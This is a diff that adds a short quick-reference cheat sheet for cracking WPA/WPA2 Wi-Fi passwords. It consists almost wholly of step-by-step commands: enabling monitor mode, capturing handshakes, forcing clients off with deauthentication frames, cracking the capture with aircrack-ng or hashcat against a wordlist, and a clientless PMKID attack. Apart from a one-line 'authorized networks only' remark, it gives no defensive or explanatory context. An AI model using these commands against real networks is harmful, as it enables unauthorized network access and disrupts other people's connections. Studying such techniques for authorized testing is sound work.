@@ -1,0 +1,34 @@
+WI-FI WPA/WPA2 CRACKING — QUICK REF
+
+Requires: ALFA (monitor mode + injection) adapter; aircrack-ng suite + hashcat
+Authorized networks only.
+
+1.  Monitor mode:
+    sudo airmon-ng check kill
+    sudo airmon-ng start wlan0        # -> wlan0mon
+    iwconfig                          # confirm Mode:Monitor
+
+2.  Scan:
+    sudo airodump-ng wlan0mon         # note BSSID, CH, ESSID, clients
+
+3.  Lock on + capture (keep open):
+    sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
+
+4.  Deauth to force handshake (2nd terminal):
+    sudo aireplay-ng --deauth 5 -a <BSSID> -c <client-MAC> wlan0mon
+    sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon      # broadcast
+    # watch capture window for "WPA handshake"
+
+5.  Crack:
+    aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture-01.cap
+    # or GPU:
+    hcxpcapngtool -o hash.22000 capture-01.cap
+    hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
+
+6.  PMKID (clientless):
+    sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --enable_status=1
+    hcxpcapngtool -o pmkid.22000 pmkid.pcapng
+    hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt
+
+    all-in-one: sudo wifite
+    cleanup:    sudo airmon-ng stop wlan0mon ; sudo systemctl restart NetworkManager
